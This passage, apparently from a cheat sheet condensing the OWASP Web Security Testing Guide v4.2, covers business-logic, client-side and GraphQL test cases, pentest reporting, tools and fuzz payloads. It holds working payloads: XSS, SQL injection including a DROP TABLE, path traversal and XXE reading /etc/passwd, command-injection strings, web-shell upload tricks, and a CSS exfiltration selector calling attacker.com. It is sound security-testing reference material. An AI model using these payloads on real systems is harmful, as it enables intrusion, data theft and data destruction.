- Test file upload integrity (can you upload a different file with same name/hash?)

---

### WSTG-BUSL-04 · Process Timing
**Objective:** Test for race conditions and timing-based logic flaws.

**How to Test:**
- Identify time-sensitive operations (financial transactions, coupon redemption)
- Submit concurrent requests for the same operation
- Test for TOCTOU (time-of-check, time-of-use) vulnerabilities

---

### WSTG-BUSL-05 · Function Use Limits
**Objective:** Test if frequency-limited functions can be exceeded.

**How to Test:**
- Identify functions with expected limits (discount codes, free trials, votes)
- Test if limits are enforced server-side
- Test for race conditions to exceed limits

---

### WSTG-BUSL-06 · Workflow Circumvention
**Objective:** Test if required process steps can be skipped.

**How to Test:**
- Map the expected workflow (e.g., cart → address → payment → confirm)
- Skip steps by directly accessing later step URLs
- Test if payment step can be bypassed to reach order confirmation

---

### WSTG-BUSL-07 · Application Misuse Defense
**Objective:** Test if application defends against misuse patterns.

**How to Test:**
- Perform actions that deviate from normal user behavior
- Verify anomaly detection triggers (rate limiting, CAPTCHA, alerts)
- Test if application responds differently to abuse patterns

---

### WSTG-BUSL-08 · Unexpected File Type Upload
**Objective:** Test if system rejects unexpected/dangerous file types.

**How to Test:**
- Upload files with unexpected extensions for the context
- Rename malicious files to allowed extensions (`.php` → `.php.jpg`)
- Test MIME type vs extension mismatch
- Test null byte injection: `shell.php%00.jpg`

---

### WSTG-BUSL-09 · Malicious File Upload
**Objective:** Test if uploaded files are scanned/sandboxed.

**How to Test:**
- Upload EICAR test file (AV detection check)
- Upload web shells (PHP, ASP, JSP)
- Upload files with malicious macros (Office)
- Test if files are stored outside webroot
- Test if uploaded file paths are guessable

**Remediation:** Store files outside webroot; randomize filenames; scan for malware; whitelist types by magic bytes.

---

## 🖥️ CLNT — Client-Side Testing

> `Info` Category Summary
> Verify client-side code and browser features are not vulnerable to manipulation or abuse.

### WSTG-CLNT-01 · DOM-Based XSS
**Objective:** Identify DOM sinks that execute attacker-controlled data.

**Common DOM Sinks:**
```javascript
document.write()
document.writeln()
innerHTML
outerHTML
eval()
setTimeout() / setInterval()
location.href
window.open()
```

**Common DOM Sources:**
```javascript
document.URL
document.referrer
location.hash
location.search
window.name
localStorage / sessionStorage
```

---

### WSTG-CLNT-02 · JavaScript Execution
**Objective:** Find JavaScript injection sinks.

**How to Test:**
- Identify where user input reaches JS execution sinks
- Test `eval()`, `Function()`, `setTimeout()`, event handlers

---

### WSTG-CLNT-03 · HTML Injection
**Objective:** Test for HTML injection where input is rendered as HTML.

**How to Test:**
- Inject `<b>bold</b>`, `<h1>heading</h1>`, `<form>` tags
- Phishing via HTML injection (fake login forms)

---

### WSTG-CLNT-04 · Client-Side URL Redirect
**Objective:** Test for open redirect vulnerabilities.

**How to Test:**
- Find redirect parameters: `?redirect=`, `?url=`, `?next=`, `?return=`
- Test: `?redirect=https://evil.com`
- Bypass filters: `?redirect=//evil.com`, `?redirect=https://example.com@evil.com`

---

### WSTG-CLNT-05 · CSS Injection
**Objective:** Test for CSS injection vulnerabilities.

**How to Test:**
- Inject CSS via user-controlled style parameters
- Test data exfiltration via CSS selectors: `input[value^="a"] { background: url(http://attacker.com/a) }`

---

### WSTG-CLNT-06 · Client-Side Resource Manipulation
**Objective:** Test if client can influence resource loading.

**How to Test:**
- Test if user-controlled data affects script/CSS src attributes
- Check if callback parameters can be manipulated (JSONP)

---

### WSTG-CLNT-07 · Cross-Origin Resource Sharing (CORS)
**Objective:** Test for overly permissive CORS configuration.

**How to Test:**
```http
GET /api/data HTTP/1.1
Origin: https://attacker.com
```
- Dangerous: `Access-Control-Allow-Origin: *` with sensitive data
- Most dangerous: `Access-Control-Allow-Origin: https://attacker.com` with `Access-Control-Allow-Credentials: true`
- Test null origin: `Origin: null`

---

### WSTG-CLNT-08 · Cross-Site Flashing
**Objective:** Test Flash (SWF) files for XSS and security policy issues.

> `Note` Flash is end-of-life (2020). Relevant only for legacy applications.

---

### WSTG-CLNT-09 · Clickjacking
**Objective:** Test if pages can be embedded in iframes for clickjacking.

**How to Test:**
```html
<iframe src="https://target.com/action" style="opacity:0;position:absolute;top:0;left:0;"></iframe>
```
- Check for `X-Frame-Options: DENY/SAMEORIGIN` header
- Check for `Content-Security-Policy: frame-ancestors 'none'` or `'self'`

---

### WSTG-CLNT-10 · WebSocket Testing
**Objective:** Identify WebSocket usage and test for same vulnerabilities as HTTP.

**How to Test:**
- Identify WebSocket connections (DevTools → Network → WS)
- Test for: authentication (is WS auth token validated?), injection in messages, origin validation
- Check `Sec-WebSocket-Origin` validation

---

### WSTG-CLNT-11 · Web Messaging (postMessage)
**Objective:** Test postMessage for missing origin validation.

**How to Test:**
- Find `window.addEventListener('message', ...)` handlers
- Test if origin is validated: `if (event.origin !== 'https://trusted.com')`
- Send malicious messages from attacker-controlled page

---

### WSTG-CLNT-12 · Browser Storage
**Objective:** Identify sensitive data stored in client-side storage.

**What to Check:**
- **`localStorage`** — Accessed by JS only; Check for sensitive tokens, PII
- **`sessionStorage`** — Accessed by JS only; Check for session tokens, sensitive data
- **`IndexedDB`** — Accessed by JS only; Check for large sensitive datasets
- **`WebSQL`** — Accessed by JS only; Check for sensitive DB data
- **`Cookies`** — Accessed by JS + HTTP; Check for session tokens (prefer HttpOnly)

**Remediation:** Don't store sensitive data client-side; use `HttpOnly` session cookies.

---

### WSTG-CLNT-13 · Cross-Site Script Inclusion (XSSI)
**Objective:** Test for sensitive data leakage via cross-site script inclusion.

**How to Test:**
- Identify JSON/JSONP endpoints returning sensitive data
- Test if endpoints can be included as `<script>` tags from another origin
- Check for non-CSRF-protected JSON endpoints returning arrays/objects

---

## 🔌 APIT — API Testing

> `Info` Category Summary
> Test modern API technologies, with focus on GraphQL in WSTG v4.2.

### WSTG-APIT-01 · GraphQL Testing
**Objective:** Ensure secure GraphQL configuration and validate all inputs.

**How to Test:**

**1. Introspection (Information Gathering):**
```graphql
{ __schema { types { name kind fields { name } } } }
```
- **Remediation:** Disable introspection in production.

**2. SQL Injection:**
```graphql
{ users(id: "1 OR 1=1") { id name } }
```

**3. XSS:**
```graphql
{ user(id: "<script>alert(1)</script>") { name } }
```

**4. DoS via Deep Queries:**
```graphql
{ allDogs { id veterinary { dogs { id veterinary { dogs { ... } } } } } }
```
- **Remediation:** Set max query depth and complexity limits.

**5. Batching Attacks:**
```graphql
{ first: auth(user:"admin"), second: auth(user:"root") }
```
- **Remediation:** Rate-limit per object; limit batch size.

**6. IDOR via Underlying API:**
- Test if GraphQL parameters translate to privileged API calls

**Tools:** GraphQL Playground, InQL (Burp), GraphQL Raider (Burp), ZAP GraphQL addon, sqlmap

---

## 📋 Reporting

> `Tip` Report Structure
> A good pentest report has two audiences: **executive management** (risk, business impact) and **technical staff** (reproduction steps, remediation details).

**Report Sections:**
1. **Version Control** — track report changes
2. **Table of Contents**
3. **The Team** — tester expertise and qualifications
4. **Scope** — agreed boundaries
5. **Limitations** — out-of-scope, broken functionality, access issues
6. **Timeline** — engagement duration
7. **Executive Summary** — high-level risk posture, critical findings
8. **Findings** — each vulnerability with:
   - Severity (Critical/High/Medium/Low/Informational)
   - Description
   - Reproduction steps
   - Impact
   - Remediation recommendation
9. **Appendices** — screenshots, payloads, raw output

**Risk Rating:** Use CVSS 3.1 or OWASP Risk Rating Methodology (Likelihood × Impact).

---

## 🧰 Essential Tools Reference

> `Example` Tools by Category

**Proxies & Traffic Interception**
- `Burp Suite` — industry-standard web proxy
- `OWASP ZAP` — free open-source alternative

**Information Gathering**
- `nmap` — port scanning and service detection
- `whatweb` / `Wappalyzer` — tech fingerprinting
- `subfinder` / `amass` — subdomain enumeration
- `theHarvester` — OSINT gathering
- `shodan` — internet-wide device search

**Scanning & Fuzzing**
- `nikto` — web server misconfiguration scanner
- `gobuster` / `ffuf` / `dirb` — directory/file brute-forcing
- `nuclei` — template-based vulnerability scanner

**Exploitation**
- `sqlmap` — automated SQL injection
- `XSStrike` — XSS detection and exploitation
- `testssl.sh` — TLS configuration testing
- `commix` — command injection
- `padbuster` — padding oracle attacks

**Wordlists**
- `SecLists` (Daniel Miessler) — comprehensive wordlists
- `RobotsDisallowed` — disallowed paths from robots.txt

**GraphQL**
- `InQL` (Burp Extension)
- `GraphQL Raider` (Burp Extension)
- `GraphQL Playground`

---

## 📎 Appendix Quick Reference

### Fuzz Vectors (Appendix C) — Common Payloads by Type

- **XSS** — `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `'><svg onload=alert(1)>`
- **SQLi** — `'`, `"`, `1' OR '1'='1`, `1; DROP TABLE users--`, `' UNION SELECT NULL--`
- **Path Traversal** — `../../../etc/passwd`, `..%2f..%2f`, `....//....//`
- **Command Injection** — `; id`, `| id`, `&& id`, `` `id` ``, `$(id)`
- **SSTI** — `{{7*7}}`, `${7*7}}`, `<%= 7*7 %>`
- **Format String** — `%s%s%s`, `%x%x%x`, `%n%n`
- **LDAP** — `*)(uid=*))(|(uid=*`, `*`
- **XML/XXE** — `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- **CRLF** — `%0d%0a`, `%0aHeader:Value`

### Encoded Injection (Appendix D)

- **URL** — `%3cscript%3e`
- **Double URL** — `%253cscript%253e`
- **HTML Entity** — `&lt;script&gt;`
- **Hex** — `\x3cscript\x3e`
- **Unicode** — `\u003cscript\u003e`
---

## 🏷️ Tags Reference

```
#WSTG #OWASP #pentesting #web-security
#XSS #SQLi #CSRF #SSRF #IDOR #SSTI
#authentication #authorization #session-management
#cryptography #business-logic #API-testing
```

---

*Based on OWASP WSTG v4.2 — © 2020 The OWASP Foundation — CC BY 4.0*
*Original PDF: 465 pages | This cheatsheet: 97 test cases across 12 categories*
